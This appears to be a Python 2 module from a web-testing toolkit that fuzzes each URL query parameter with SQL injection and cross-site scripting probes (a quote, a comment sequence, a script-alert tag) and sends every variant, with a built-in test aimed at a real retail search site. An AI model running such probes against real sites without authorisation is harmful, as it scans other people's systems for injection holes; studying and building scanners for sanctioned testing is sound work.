#!/usr/bin/python

import urllib
import urlparse
import httplib
import traceback

from abrupt.http import HTTPConnection

class Injection():

  def __init__(self, r):
    payloads = g()
    self.rs = self._inject_query(r, payloads)

  def _inject_query(self, r, payloads):
    rs = [] 
    parsed_url = urlparse.urlparse(r.url)
    i_pts = urlparse.parse_qs(r.query, True)
    for i_pt in i_pts:
      nq = i_pts.copy()
      for p in payloads:
        nq[i_pt] = [e(p),]
        s = list(parsed_url)
        s[4] = urllib.urlencode(nq, True)
        r_new = r.copy()
        r_new.url = urlparse.urlunparse(s)
        rs.append(r_new)
    return rs

  def __str__(self):
    return "[" + ", ".join([r.query for r in self.rs]) +"]"

  def run(self):
    if self.rs:
      conn = self._init_connection(self.rs[0]) 
      for r in self.rs:
        next = False
        while not next:
          try:
            print repr(r)
            r(conn=conn)
            conn._clear()
            print repr(r.response)
            next = True
          except httplib.HTTPException:
            print "oula"
            traceback.print_exc()
            conn = self._init_connection(self.rs[0]) 
            next = False
      conn.close()

  def _init_connection(self, r):
    if r.use_ssl:
      conn = httplib.HTTPSConnection(r.hostname + ":" + str(r.port))
    else:
      conn = HTTPConnection(r.hostname + ":" + str(r.port))
    return conn

def g():
  return  ['\'', '\' --', '><script>alert(1)</script>', '-1', '2-1']

def e(s):
  return urllib.quote_plus(s)  

def test():
  from StringIO import StringIO
  from http import Request
  s = StringIO("GET http://recherche.fnac.com/Search/SearchResult.aspx?Search=tout HTTP/1.1\r\nHost: recherche.fnac.com\r\nConnection: keep-alive\r\n\r\n")
  r = Request(s)
  i = Injection(r)
  print i
  i.run()

if __name__ == '__main__':
  test()
